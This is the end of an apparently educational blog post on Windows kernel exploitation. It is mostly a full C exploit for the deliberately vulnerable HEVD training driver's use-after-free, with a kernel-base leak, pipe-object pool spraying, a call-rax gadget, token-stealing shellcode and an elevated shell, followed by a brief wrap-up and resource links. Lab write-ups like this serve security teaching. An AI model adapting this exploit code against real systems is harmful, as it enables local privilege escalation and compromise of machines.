+</span></span><span style="display:flex;"><span>	hDevice <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver"</span>, GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE, FILE_SHARE_READ <span style="color:#f92672">|</span> FILE_SHARE_WRITE, <span style="color:#ae81ff">0</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hDevice <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Couldn't get HANDLE to driver, error %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	QWORD ntBase <span style="color:#f92672">=</span> <span style="color:#a6e22e">getBaseAddr</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">"ntoskrnl.exe"</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[*] leaked ntoskrnl base @ 0x%016llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, ntBase);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// sickle.py --format c --payload windows/x64/kernel_token_stealer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00\x48\x8b\x80</span><span style="color:#e6db74">"</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xb8\x00\x00\x00\x48\x89\xc1\xb2\x04\x48\x8b\x80\x48\x04</span><span style="color:#e6db74">"</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x00\x00\x48\x2d\x48\x04\x00\x00\x38\x90\x40\x04\x00\x00</span><span style="color:#e6db74">"</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x75\xeb\x48\x8b\x90\xb8\x04\x00\x00\x48\x89\x91\xb8\x04</span><span style="color:#e6db74">"</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">"</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x48\x83\xC4\x08</span><span style="color:#e6db74">"</span> <span style="color:#75715e">// add rsp, 0x8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xC3</span><span style="color:#e6db74">"</span>;            <span style="color:#75715e">// ret (return to UseUaFObjectNonPagedPool)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[i] Allocating objects for defragmentation spray...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	p_rwPipe defrag_pipeHandles <span style="color:#f92672">=</span> (p_rwPipe)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">20000</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(rwPipe));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">20000</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		rwPipe pipeHandle <span style="color:#f92672">=</span> <span style="color:#a6e22e">objSpray</span>();
+</span></span><span style="display:flex;"><span>		defrag_pipeHandles[i] <span style="color:#f92672">=</span> pipeHandle;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[i] Allocating objects for sequential spray...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	p_rwPipe seq_pipeHandles <span style="color:#f92672">=</span> (p_rwPipe)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">60000</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(rwPipe));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">60000</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		rwPipe pipeHandle <span style="color:#f92672">=</span> <span style="color:#a6e22e">objSpray</span>();
+</span></span><span style="display:flex;"><span>		seq_pipeHandles[i] <span style="color:#f92672">=</span> pipeHandle;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[i] Punching holes...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(seq_pipeHandles); i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			rwPipe pipeHandles <span style="color:#f92672">=</span> seq_pipeHandles[i];
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">CloseHandle</span>(pipeHandles.hRead);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">CloseHandle</span>(pipeHandles.hWrite);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[i] Calling AllocateUaFObjectNonPagedPool, IOCTL: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x804</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">DeviceIoControl</span>(hDevice, <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x804</span>), NULL, <span style="color:#ae81ff">0</span>, NULL, <span style="color:#ae81ff">0</span>, NULL, NULL)) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] AllocateUaFObjectNonPagedPool failed, error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[i] Calling FreeUaFObjectNonPagedPool, IOCTL: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x806</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">DeviceIoControl</span>(hDevice, <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x806</span>), NULL, <span style="color:#ae81ff">0</span>, NULL, <span style="color:#ae81ff">0</span>, NULL, NULL)) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] FreeUaFObjectNonPagedPool failed, error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	_fakeObj fakeObj;
+</span></span><span style="display:flex;"><span>	QWORD<span style="color:#f92672">*</span> fakeObjBuffer  <span style="color:#f92672">=</span> (QWORD<span style="color:#f92672">*</span>)fakeObj.Buffer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	QWORD CALL_RAX_GADGET <span style="color:#f92672">=</span> ntBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3FC667</span>; <span style="color:#75715e">// add al, 0x10; call rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	fakeObjBuffer[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> (QWORD)CALL_RAX_GADGET;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>fakeObjBuffer[<span style="color:#ae81ff">2</span>], shellcode, <span style="color:#66d9ef">sizeof</span>(shellcode));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[*] Writing to holes...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">30000</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">DeviceIoControl</span>(hDevice, <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x807</span>), fakeObj.Buffer, <span style="color:#66d9ef">sizeof</span>(fakeObj), NULL, <span style="color:#ae81ff">0</span>, NULL, NULL)) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] AllocateFakeObjectNonPagedPool failed, error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[*] Triggering UAF</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">DeviceIoControl</span>(hDevice, <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x805</span>), NULL, <span style="color:#ae81ff">0</span>, NULL, <span style="color:#ae81ff">0</span>, NULL, NULL)) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] UseUaFObjectNonPagedPool failed, error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkEoP</span>()) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[!] Enjoy your elevated shell!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"cmd.exe"</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Exploit failed, run it again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre><button class="copy-code">copy</button></div><p>The screenshot from the final exploit:</p>
+<p><img alt="210f187df1f5ebfff177fcd1ade68e8b.png" loading="lazy" src="https://m2rc.net/210f187df1f5ebfff177fcd1ade68e8b.png"></p>
+<p>I will probably do the “Nx” version of this very same bug soon, in which the allocated pool is not marked as executable, so we will have to bypass SMEP.</p>
+<p>If you’ve stuck around until this point, thank you for reading the post! I hope you’ve learned something new.</p>
+<h2 id="resources">Resources<a class="anchor" aria-hidden="true" href="https://m2rc.net/posts/hevd-useafterfree/#resources">#</a></h2>
+<ul>
+<li><a href="https://securityinsecurity.github.io/exploiting-hevd-use-after-free/">https://securityinsecurity.github.io/exploiting-hevd-use-after-free/</a></li>
+<li><a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/</a></li>
+<li><a href="https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-1/">https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-1/</a></li>
+<li><a href="https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/">https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/</a></li>
+<li><a href="https://wetw0rk.github.io/posts/0x03-approaching-the-modern-windows-kernel-heap/">https://wetw0rk.github.io/posts/0x03-approaching-the-modern-windows-kernel-heap/</a></li>
+<li><a href="https://web.archive.org/web/20200516083002/https://research.nccgroup.com/2020/05/11/cve-2018-8611-exploiting-windows-ktm-part-3-5-triggering-the-race-condition-and-debugging-tricks/">https://web.archive.org/web/20200516083002/https://research.nccgroup.com/2020/05/11/cve-2018-8611-exploiting-windows-ktm-part-3-5-triggering-the-race-condition-and-debugging-tricks/</a></li>
+</ul>
+
+
+  </div>
+
+  
+</article>
+    </main>
+    
+
+<a href="https://m2rc.net/posts/hevd-useafterfree/#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z"></path>
+    </svg>
+</a>
+
+
+
+
+
+
+
+
+</body></html>
